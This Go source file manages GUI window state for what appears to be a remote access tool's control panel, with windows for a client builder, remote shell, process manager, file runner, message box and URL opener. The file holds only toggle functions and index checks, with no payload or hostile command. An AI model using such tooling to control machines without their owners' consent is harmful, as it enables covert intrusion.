package render

import "github.com/codeuk/pout/cmd/server"

var (
	// The index of the client that our last operation was performed on.
	ClientSelected int

	// Window monitoring variables.
	ClientBuilderWindowOpen bool
	ClientRunFileWindowOpen bool
	ClientShellWindowOpen   bool
	ClientProcessWindowOpen bool
	ClientMsgBoxWindowOpen  bool
	ClientURLWindowOpen     bool

	// Latest combo box option(s) selected.
	IconIndexLastSelected   int32
	ButtonIndexLastSelected int32
)

// `VerifyCurrentClient` verifies that the passed index is within the valid range of the servers Connections
// and returns the derived Client using the aforementioned index if it is valid.
func VerifyCurrentClient() *server.Client {
	// Verify that the current client is valid.
	if !(ClientSelected < 0 || ClientSelected >= len(server.CurrentServer.Connections)) {
		// Return the derived client.
		return server.CurrentServer.Connections[ClientSelected]
	}

	return nil
}

// Window managers.

// `ManageWindowConflict` Makes sure the windows aren't conflicting and that ClientSelected is valid.
// Only one window can be open at a time due to the way each clients data is managed and processed.
// Returns the derived client if ClientSelected is a valid index in the server, otherwise nil.
func ManageWindowConflict(currentWindowToggler func(i int)) *server.Client {
	// Close all of the client related windows.
	ClientURLWindowOpen = false
	ClientShellWindowOpen = false
	ClientMsgBoxWindowOpen = false
	ClientProcessWindowOpen = false
	ClientRunFileWindowOpen = false

	if client := VerifyCurrentClient(); client != nil {
		// Retoggle the window with the valid client.
		currentWindowToggler(ClientSelected)

		return client
	}

	return nil
}

// Window togglers.
func ToggleClientBuilderOpen() {
	ClientBuilderWindowOpen = !ClientBuilderWindowOpen
}

func ToggleRunFileOpen(clientID int) {
	ClientRunFileWindowOpen = !ClientRunFileWindowOpen
	ClientSelected = clientID
}

func ToggleClientShellOpen(clientID int) {
	ClientShellWindowOpen = !ClientShellWindowOpen
	ClientSelected = clientID
}

func ToggleClientProcessManagerOpen(clientID int) {
	ClientProcessWindowOpen = !ClientProcessWindowOpen
	ClientSelected = clientID
}

func ToggleClientMsgBoxOpen(clientID int) {
	ClientMsgBoxWindowOpen = !ClientMsgBoxWindowOpen
	ClientSelected = clientID
}

func ToggleURLOpenerOpen(clientID int) {
	ClientURLWindowOpen = !ClientURLWindowOpen
	ClientSelected = clientID
}
